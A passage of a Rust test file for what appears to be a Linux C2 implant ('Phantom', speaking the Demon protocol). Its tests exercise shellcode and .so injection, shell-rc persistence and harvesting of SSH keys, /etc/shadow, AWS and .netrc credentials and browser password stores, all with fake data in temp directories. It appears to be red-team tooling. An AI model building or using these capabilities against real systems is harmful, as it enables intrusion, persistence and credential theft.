    payload.extend_from_slice(&pid.to_le_bytes());
    // dll_ldr as length-prefixed bytes
    payload.extend_from_slice(&(dll_ldr.len() as i32).to_le_bytes());
    payload.extend_from_slice(dll_ldr);
    // dll_bytes as length-prefixed bytes
    payload.extend_from_slice(&(dll_bytes.len() as i32).to_le_bytes());
    payload.extend_from_slice(dll_bytes);
    // parameter as length-prefixed bytes
    payload.extend_from_slice(&(parameter.len() as i32).to_le_bytes());
    payload.extend_from_slice(parameter);
    payload
}

/// Helper to build a `CommandSpawnDll` task payload.
fn build_spawn_dll_payload(dll_ldr: &[u8], dll_bytes: &[u8], arguments: &[u8]) -> Vec<u8> {
    let mut payload = Vec::new();
    // dll_ldr as length-prefixed bytes
    payload.extend_from_slice(&(dll_ldr.len() as i32).to_le_bytes());
    payload.extend_from_slice(dll_ldr);
    // dll_bytes as length-prefixed bytes
    payload.extend_from_slice(&(dll_bytes.len() as i32).to_le_bytes());
    payload.extend_from_slice(dll_bytes);
    // arguments as length-prefixed bytes
    payload.extend_from_slice(&(arguments.len() as i32).to_le_bytes());
    payload.extend_from_slice(arguments);
    payload
}

/// `CommandInjectShellcode` with an invalid PID produces a failure
/// response with status != 0 and the correct command ID.
#[tokio::test]
async fn inject_shellcode_invalid_pid_returns_failure() {
    let shellcode = b"\xcc"; // int3
    let payload = build_inject_shellcode_payload(
        super::INJECT_WAY_INJECT,
        0, // technique
        1, // x64
        shellcode,
        &[],
        999_999_999, // non-existent PID
    );
    let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x10, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
        panic!("expected Structured callback, got: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandInjectShellcode));
    assert_eq!(*request_id, 0x10);
    // Status should be non-zero (failure).
    let mut offset = 0;
    let status = read_u32(payload, &mut offset);
    assert_ne!(status, 0, "injection into non-existent PID must fail");
}

/// `CommandInjectShellcode` with empty shellcode produces a failure response.
#[tokio::test]
async fn inject_shellcode_empty_payload_returns_failure() {
    let payload = build_inject_shellcode_payload(
        super::INJECT_WAY_EXECUTE,
        0,
        1,
        &[], // empty shellcode
        &[],
        0,
    );
    let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x20, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback");
    };
    let mut offset = 0;
    let status = read_u32(payload, &mut offset);
    assert_eq!(status, super::INJECT_ERROR_FAILED);
}

/// `CommandInjectShellcode` with unknown injection way returns failure.
#[tokio::test]
async fn inject_shellcode_unknown_way_returns_failure() {
    let payload = build_inject_shellcode_payload(
        99, // unknown way
        0,
        1,
        b"\x90", // NOP
        &[],
        0,
    );
    let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x30, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback");
    };
    let mut offset = 0;
    let status = read_u32(payload, &mut offset);
    assert_eq!(status, super::INJECT_ERROR_FAILED);
}

/// `CommandInjectDll` with a non-existent PID produces a failure response.
#[tokio::test]
async fn inject_dll_invalid_pid_returns_failure() {
    let dll_bytes = b"\x7fELF_fake_so"; // not a real .so but exercises the path
    let payload = build_inject_dll_payload(
        0,           // technique
        999_999_999, // non-existent PID
        &[],         // dll_ldr (ignored on Linux)
        dll_bytes,
        &[], // parameter
    );
    let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x40, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandInjectDll));
    let mut offset = 0;
    let status = read_u32(payload, &mut offset);
    assert_ne!(status, 0, "injection into non-existent PID must fail");
}

/// `CommandInjectDll` with empty .so bytes produces a failure response.
#[tokio::test]
async fn inject_dll_empty_payload_returns_failure() {
    let payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
    let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x50, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback");
    };
    let mut offset = 0;
    let status = read_u32(payload, &mut offset);
    assert_eq!(status, super::INJECT_ERROR_FAILED);
}

/// `CommandSpawnDll` with empty .so bytes produces a failure response.
#[tokio::test]
async fn spawn_dll_empty_payload_returns_failure() {
    let payload = build_spawn_dll_payload(&[], &[], &[]);
    let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 0x60, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandSpawnDll));
    let mut offset = 0;
    let status = read_u32(payload, &mut offset);
    assert_eq!(status, super::INJECT_ERROR_FAILED);
}

/// Verify that all three injection response payloads are exactly 4 bytes
/// (a single u32 status), matching the Demon protocol.
#[tokio::test]
async fn injection_response_payload_is_4_bytes() {
    let mut state = PhantomState::default();

    // Inject shellcode with empty payload (will fail, but response format is what matters).
    let sc_payload = build_inject_shellcode_payload(super::INJECT_WAY_EXECUTE, 0, 1, &[], &[], 0);
    execute(
        &DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, sc_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("execute shellcode");

    // Inject DLL with empty payload.
    let dll_payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
    execute(
        &DemonPackage::new(DemonCommand::CommandInjectDll, 2, dll_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("execute dll");

    // Spawn DLL with empty payload.
    let spawn_payload = build_spawn_dll_payload(&[], &[], &[]);
    execute(
        &DemonPackage::new(DemonCommand::CommandSpawnDll, 3, spawn_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("execute spawn dll");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 3);
    for cb in &callbacks {
        let PendingCallback::Structured { payload, .. } = cb else {
            panic!("expected Structured callback");
        };
        assert_eq!(payload.len(), 4, "injection response must be exactly 4 bytes (u32 status)");
    }
}

/// Verify that `find_libc_base` returns a valid address for our own process.
#[test]
fn find_libc_base_returns_valid_address() {
    let pid = std::process::id();
    let base = super::find_libc_base(pid);
    assert!(base.is_some(), "should find libc in own process");
    assert!(base.expect("checked") > 0);
}

/// Verify that `resolve_dlopen_in_target` returns an address for our own libc.
#[test]
fn resolve_dlopen_returns_valid_address() {
    let pid = std::process::id();
    let libc_base = super::find_libc_base(pid).expect("find libc base");
    let addr = super::resolve_dlopen_in_target(libc_base);
    assert!(addr.is_some(), "should resolve dlopen in own process");
    assert!(addr.expect("checked") > libc_base, "dlopen should be past libc base");
}

/// `check_ptrace_permission` should return a boolean without panicking,
/// regardless of the system's Yama configuration.
#[test]
fn check_ptrace_permission_does_not_panic() {
    // Use our own PID — we don't actually ptrace, just check permissions.
    let result = super::check_ptrace_permission(std::process::id());
    // On most CI/dev systems scope is 0 or 1, so this should be true.
    // We don't assert the value since it depends on the system config,
    // but we verify it doesn't panic.
    let _ = result;
}

/// `check_ptrace_permission` returns false for scope=3 (disabled).
/// We can't easily change the real sysctl in a test, but we verify the
/// function reads the file and returns a sensible value for our own PID.
#[test]
fn check_ptrace_permission_returns_bool_for_own_pid() {
    let allowed = super::check_ptrace_permission(std::process::id());
    // Read the actual scope to know what to expect.
    let scope = std::fs::read_to_string("/proc/sys/kernel/yama/ptrace_scope")
        .map(|s| s.trim().parse::<u32>().unwrap_or(0))
        .unwrap_or(0);
    if scope == 3 {
        assert!(!allowed, "scope=3 must deny ptrace");
    }
    // For scope 0/1, allowed should generally be true. For scope 2 it
    // depends on capabilities. We just verify consistency with scope=3.
}

/// `read_from_proc_mem` can read bytes from our own process memory.
#[test]
fn read_from_proc_mem_reads_own_memory() {
    let data: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE];
    let addr = data.as_ptr() as u64;
    let result = super::read_from_proc_mem(std::process::id(), addr, 8);
    assert!(result.is_ok(), "should read own process memory");
    assert_eq!(result.expect("checked"), data);
}

// ---- Windows-only command rejection tests ----

/// Helper: verify a Windows-only command returns a not-supported error.
async fn assert_windows_only_rejected(command: DemonCommand) {
    let package = DemonPackage::new(command, 77, Vec::new());
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
        panic!("expected single Error callback for {command:?}, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 77);
    assert!(
        text.contains("not supported on Linux"),
        "expected 'not supported on Linux' in error for {command:?}, got: {text}",
    );
}

#[tokio::test]
async fn windows_only_command_token_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandToken).await;
}

#[tokio::test]
async fn windows_only_command_inline_execute_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandInlineExecute).await;
}

#[tokio::test]
async fn windows_only_command_job_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandJob).await;
}

#[tokio::test]
async fn windows_only_command_ps_import_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandPsImport).await;
}

#[tokio::test]
async fn windows_only_command_assembly_inline_execute_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandAssemblyInlineExecute).await;
}

#[tokio::test]
async fn windows_only_command_assembly_list_versions_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandAssemblyListVersions).await;
}

#[tokio::test]
async fn windows_only_command_proc_ppid_spoof_rejected() {
    assert_windows_only_rejected(DemonCommand::CommandProcPpidSpoof).await;
}

// ------------------------------------------------------------------
// CommandPackageDropped
// ------------------------------------------------------------------

#[tokio::test]
async fn package_dropped_queues_error_callback() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(128_000_i32).to_le_bytes()); // dropped length
    payload.extend_from_slice(&(65_536_i32).to_le_bytes()); // max length
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state)
        .await
        .expect("execute package dropped");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Error { request_id, text } = &callbacks[0] else {
        panic!("expected Error callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 42);
    assert!(text.contains("128000"), "should mention dropped length");
    assert!(text.contains("65536"), "should mention max length");
}

#[tokio::test]
async fn package_dropped_marks_matching_download_for_removal() {
    let mut state = PhantomState::default();

    // Manually insert an active download with request_id 99.
    let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped");
    std::fs::write(&tmp, b"test data").expect("write temp file");
    let file = std::fs::File::open(&tmp).expect("open temp file");
    state.downloads.push(super::ActiveDownload {
        file_id: 1,
        request_id: 99,
        file,
        total_size: 9,
        read_size: 0,
        state: DownloadTransferState::Running,
    });

    let mut payload = Vec::new();
    payload.extend_from_slice(&(200_000_i32).to_le_bytes());
    payload.extend_from_slice(&(65_536_i32).to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.downloads[0].state, DownloadTransferState::Remove);

    let _ = std::fs::remove_file(&tmp);
}

#[tokio::test]
async fn package_dropped_leaves_unrelated_downloads_intact() {
    let mut state = PhantomState::default();

    let tmp = std::env::temp_dir().join("phantom_test_pkg_dropped_other");
    std::fs::write(&tmp, b"other data").expect("write temp file");
    let file = std::fs::File::open(&tmp).expect("open temp file");
    state.downloads.push(super::ActiveDownload {
        file_id: 2,
        request_id: 50,
        file,
        total_size: 10,
        read_size: 0,
        state: DownloadTransferState::Running,
    });

    let mut payload = Vec::new();
    payload.extend_from_slice(&(200_000_i32).to_le_bytes());
    payload.extend_from_slice(&(65_536_i32).to_le_bytes());
    // Different request_id — should not touch the download.
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.downloads[0].state, DownloadTransferState::Running);

    let _ = std::fs::remove_file(&tmp);
}

#[tokio::test]
async fn package_dropped_with_short_payload_returns_parse_error() {
    // Only one u32 instead of two.
    let payload = (128_000_i32).to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
    let mut state = PhantomState::default();

    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_err());
}

// ── Persistence tests ──────────────────────────────────────────────────

fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
    let mut p = Vec::new();
    p.extend_from_slice(&(method as i32).to_le_bytes());
    p.extend_from_slice(&(op as i32).to_le_bytes());
    if op == 0 {
        // Install: include length-prefixed command string
        let cmd_bytes = command.as_bytes();
        p.extend_from_slice(&(cmd_bytes.len() as i32).to_le_bytes());
        p.extend_from_slice(cmd_bytes);
    }
    p
}

#[tokio::test]
async fn persist_unknown_method_returns_parse_error() {
    let payload = persist_payload(99, 0, "/bin/true");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_err(), "unknown method must return a parse error");
}

#[tokio::test]
async fn persist_unknown_op_returns_parse_error() {
    let payload = persist_payload(1, 99, "/bin/true");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_err(), "unknown op must return a parse error");
}

#[test]
fn remove_shell_rc_block_strips_delimited_section() {
    let text = "line1\nline2\n# BEGIN # red-cell-c2\n/bin/payload\n# END # red-cell-c2\nline3\n";
    let result = super::remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
    assert!(result.contains("line1"), "line before block must remain");
    assert!(result.contains("line3"), "line after block must remain");
    assert!(!result.contains("/bin/payload"), "command inside block must be removed");
    assert!(!result.contains("BEGIN"), "begin marker must be removed");
    assert!(!result.contains("END"), "end marker must be removed");
}

#[test]
fn remove_shell_rc_block_no_block_returns_unchanged() {
    let text = "line1\nline2\n";
    let result = super::remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
    assert_eq!(result, "line1\nline2\n");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_install_writes_block_to_tempfiles() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let home = tmp.path().to_str().expect("valid path").to_owned();
    // Hold the HOME_LOCK for the entire test body so that parallel tests
    // cannot overwrite HOME while this test is running.
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", &home);
    }

    // Create stub rc files
    let bashrc = tmp.path().join(".bashrc");
    let profile = tmp.path().join(".profile");
    fs::write(&bashrc, "# existing\n").expect("write bashrc");
    fs::write(&profile, "# existing\n").expect("write profile");

    let payload = persist_payload(3, 0, "/bin/payload"); // ShellRc=3, Install=0
    let package = DemonPackage::new(DemonCommand::CommandPersist, 42, payload);
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 42);
    assert!(text.contains("installed"), "callback must confirm install: {text}");

    let bashrc_content = fs::read_to_string(&bashrc).expect("read bashrc");
    assert!(bashrc_content.contains("/bin/payload"), ".bashrc must contain payload cmd");
    assert!(bashrc_content.contains("red-cell-c2"), ".bashrc must contain marker");

    let profile_content = fs::read_to_string(&profile).expect("read profile");
    assert!(profile_content.contains("/bin/payload"), ".profile must contain payload cmd");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_install_idempotent() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let home = tmp.path().to_str().expect("valid path").to_owned();
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", &home);
    }

    let bashrc = tmp.path().join(".bashrc");
    let profile = tmp.path().join(".profile");
    fs::write(&bashrc, "").expect("write bashrc");
    fs::write(&profile, "").expect("write profile");

    // Install once
    let payload = persist_payload(3, 0, "/bin/payload");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    let _ = state.drain_callbacks();

    // Install again — should report already present
    let payload2 = persist_payload(3, 0, "/bin/payload");
    let package2 = DemonPackage::new(DemonCommand::CommandPersist, 2, payload2);
    execute(&package2, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert!(text.contains("already present"), "second install must report already-present: {text}");

    // Verify .bashrc has exactly one block
    let content = fs::read_to_string(&bashrc).expect("read bashrc");
    assert_eq!(content.matches("red-cell-c2").count(), 2, "one BEGIN + one END marker");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_remove_strips_block() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let home = tmp.path().to_str().expect("valid path").to_owned();
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", &home);
    }

    let bashrc = tmp.path().join(".bashrc");
    let profile = tmp.path().join(".profile");
    fs::write(&bashrc, "").expect("write bashrc");
    fs::write(&profile, "").expect("write profile");

    // Install
    let payload = persist_payload(3, 0, "/bin/payload");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("install");
    let _ = state.drain_callbacks();

    // Remove
    let payload_rm = persist_payload(3, 1, ""); // ShellRc=3, Remove=1
    let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 2, payload_rm);
    execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("remove");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert!(text.contains("removed"), "callback must confirm removal: {text}");

    let content = fs::read_to_string(&bashrc).expect("read bashrc");
    assert!(!content.contains("/bin/payload"), ".bashrc must not contain payload after remove");
    assert!(!content.contains("red-cell-c2"), ".bashrc must not contain marker after remove");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_remove_when_not_present() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", tmp.path().to_str().expect("valid path"));
    }
    fs::write(tmp.path().join(".bashrc"), "").expect("write bashrc");
    fs::write(tmp.path().join(".profile"), "").expect("write profile");

    let payload_rm = persist_payload(3, 1, "");
    let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 5, payload_rm);
    let mut state = PhantomState::default();
    execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert!(text.contains("not found"), "must report not-found: {text}");
}

// ── is_private_key_bytes ──────────────────────────────────────────────

#[test]
fn is_private_key_bytes_accepts_pem_rsa_private() {
    let pem = b"-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----";
    assert!(is_private_key_bytes(pem));
}

#[test]
fn is_private_key_bytes_accepts_pem_openssh_private() {
    let pem = b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----";
    assert!(is_private_key_bytes(pem));
}

#[test]
fn is_private_key_bytes_accepts_pem_ec_private() {
    let pem = b"-----BEGIN EC PRIVATE KEY-----\ndata\n-----END EC PRIVATE KEY-----";
    assert!(is_private_key_bytes(pem));
}

#[test]
fn is_private_key_bytes_accepts_openssh_binary_magic() {
    let mut magic = b"openssh-key-v1\x00".to_vec();
    magic.extend_from_slice(b"extra payload bytes here");
    assert!(is_private_key_bytes(&magic));
}

#[test]
fn is_private_key_bytes_rejects_pem_public_key() {
    let pub_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----";
    assert!(!is_private_key_bytes(pub_key));
}

#[test]
fn is_private_key_bytes_rejects_rsa_public_key() {
    let rsa_pub = b"-----BEGIN RSA PUBLIC KEY-----\ndata\n-----END RSA PUBLIC KEY-----";
    assert!(!is_private_key_bytes(rsa_pub));
}

#[test]
fn is_private_key_bytes_rejects_arbitrary_bytes() {
    assert!(!is_private_key_bytes(b"not a key at all"));
    assert!(!is_private_key_bytes(b""));
    assert!(!is_private_key_bytes(b"\x00\x01\x02\x03"));
}

// ── encode_harvest_entries ────────────────────────────────────────────
//
// The "expected" bytes are built with the same logic used by the teamserver's
// hand-coded `make_payload` helper in harvest.rs tests, so any divergence in
// byte order or length-prefix width will be caught here.

fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
    for (kind, path, data) in entries {
        buf.extend_from_slice(&(kind.len() as u32).to_le_bytes());
        buf.extend_from_slice(kind.as_bytes());
        buf.extend_from_slice(&(path.len() as u32).to_le_bytes());
        buf.extend_from_slice(path.as_bytes());
        buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
        buf.extend_from_slice(data);
    }
    buf
}

#[test]
fn encode_harvest_entries_empty_produces_four_zero_bytes() {
    let result = encode_harvest_entries(&[]).expect("encode must succeed");
    assert_eq!(result, harvest_expected_payload(&[]));
    assert_eq!(result, [0u8, 0, 0, 0]);
}

#[test]
fn encode_harvest_entries_single_round_trips() {
    let entries = [HarvestEntry {
        kind: "ssh_key".to_owned(),
        path: "/home/user/.ssh/id_rsa".to_owned(),
        data: b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----"
            .to_vec(),
    }];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");
    let expected = harvest_expected_payload(&[(
        "ssh_key",
        "/home/user/.ssh/id_rsa",
        b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----",
    )]);
    assert_eq!(result, expected);
}

#[test]
fn encode_harvest_entries_multiple_round_trips() {
    let entries = [
        HarvestEntry {
            kind: "shadow".to_owned(),
            path: "/etc/shadow".to_owned(),
            data: b"root:$6$hash:19000:0:99999:7:::".to_vec(),
        },
        HarvestEntry {
            kind: "credentials".to_owned(),
            path: "/root/.aws/credentials".to_owned(),
            data: b"[default]\naws_access_key_id=AKIA...".to_vec(),
        },
    ];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");
    let expected = harvest_expected_payload(&[
        ("shadow", "/etc/shadow", b"root:$6$hash:19000:0:99999:7:::"),
        ("credentials", "/root/.aws/credentials", b"[default]\naws_access_key_id=AKIA..."),
    ]);
    assert_eq!(result, expected);
}

#[test]
fn encode_harvest_entries_count_field_is_little_endian_u32() {
    // Verify the leading 4 bytes encode the entry count in LE byte order.
    let entries = [
        HarvestEntry {
            kind: "shadow".to_owned(),
            path: "/etc/shadow".to_owned(),
            data: b"data".to_vec(),
        },
        HarvestEntry {
            kind: "cookie_db".to_owned(),
            path: "/home/user/.config/chromium/Default/Cookies".to_owned(),
            data: b"SQLiteDB".to_vec(),
        },
    ];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");
    let count = u32::from_le_bytes(result[..4].try_into().expect("4-byte prefix"));
    assert_eq!(count, 2);
}

#[test]
fn encode_harvest_entries_field_lengths_are_little_endian_u32() {
    // Verify every length prefix inside the payload is a LE u32.
    let kind = "ssh_key";
    let path = "/home/user/.ssh/id_rsa";
    let data = b"key material";
    let entries =
        [HarvestEntry { kind: kind.to_owned(), path: path.to_owned(), data: data.to_vec() }];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");

    let mut pos = 0usize;
    let read_u32_le = |buf: &[u8], p: &mut usize| -> u32 {
        let v = u32::from_le_bytes(buf[*p..*p + 4].try_into().expect("4 bytes"));
        *p += 4;
        v
    };

    let count = read_u32_le(&result, &mut pos);
    assert_eq!(count, 1);

    let kind_len = read_u32_le(&result, &mut pos) as usize;
    assert_eq!(kind_len, kind.len());
    assert_eq!(&result[pos..pos + kind_len], kind.as_bytes());
    pos += kind_len;

    let path_len = read_u32_le(&result, &mut pos) as usize;
    assert_eq!(path_len, path.len());
    assert_eq!(&result[pos..pos + path_len], path.as_bytes());
    pos += path_len;

    let data_len = read_u32_le(&result, &mut pos) as usize;
    assert_eq!(data_len, data.len());
    assert_eq!(&result[pos..pos + data_len], data);
    pos += data_len;

    assert_eq!(pos, result.len(), "no trailing bytes");
}

// ── collect_netrc ─────────────────────────────────────────────────────

#[test]
fn collect_netrc_harvests_existing_file() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let netrc_path = home.path().join(".netrc");
    fs::write(&netrc_path, b"machine example.com login user password secret\n").expect("write");

    let mut entries = Vec::new();
    collect_netrc(home.path(), &mut entries);

    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].kind, "credentials");
    assert!(entries[0].path.ends_with(".netrc"));
    assert_eq!(entries[0].data, b"machine example.com login user password secret\n");
}

#[test]
fn collect_netrc_skips_missing_file() {
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let mut entries = Vec::new();
    collect_netrc(home.path(), &mut entries);
    assert!(entries.is_empty());
}

#[test]
fn collect_netrc_skips_empty_file() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    fs::write(home.path().join(".netrc"), b"").expect("write");

    let mut entries = Vec::new();
    collect_netrc(home.path(), &mut entries);
    assert!(entries.is_empty());
}

// ── collect_browser_passwords ─────────────────────────────────────────

#[test]
fn collect_browser_passwords_harvests_chromium_login_data() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let login_data_dir = home.path().join(".config/google-chrome/Default");
    fs::create_dir_all(&login_data_dir).expect("mkdir");
    fs::write(login_data_dir.join("Login Data"), b"SQLite format 3\x00fake-login-db")
        .expect("write");

    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);

    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].kind, "credentials");
    assert!(entries[0].path.contains("Login Data"));
}

#[test]
fn collect_browser_passwords_harvests_firefox_logins_and_key4() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let profile_dir = home.path().join(".mozilla/firefox/abc123.default");
    fs::create_dir_all(&profile_dir).expect("mkdir");
    fs::write(
        profile_dir.join("logins.json"),
        b"{\"logins\":[{\"hostname\":\"https://example.com\"}]}",
    )
    .expect("write logins.json");
    fs::write(profile_dir.join("key4.db"), b"SQLite format 3\x00fake-nss-key-db")
        .expect("write key4.db");

    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);

    assert_eq!(entries.len(), 2, "expected both logins.json and key4.db");
    let paths: Vec<&str> = entries.iter().map(|e| e.path.as_str()).collect();
    assert!(paths.iter().any(|p| p.contains("logins.json")), "missing logins.json entry");
    assert!(paths.iter().any(|p| p.contains("key4.db")), "missing key4.db entry");
    assert!(entries.iter().all(|e| e.kind == "credentials"));
}

#[test]
fn collect_browser_passwords_firefox_logins_only_without_key4() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let profile_dir = home.path().join(".mozilla/firefox/xyz789.default-release");
    fs::create_dir_all(&profile_dir).expect("mkdir");
    fs::write(profile_dir.join("logins.json"), b"{\"logins\":[]}").expect("write logins.json");
    // key4.db intentionally absent

    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);

    assert_eq!(entries.len(), 1, "should still harvest logins.json alone");
    assert!(entries[0].path.contains("logins.json"));
}

#[test]
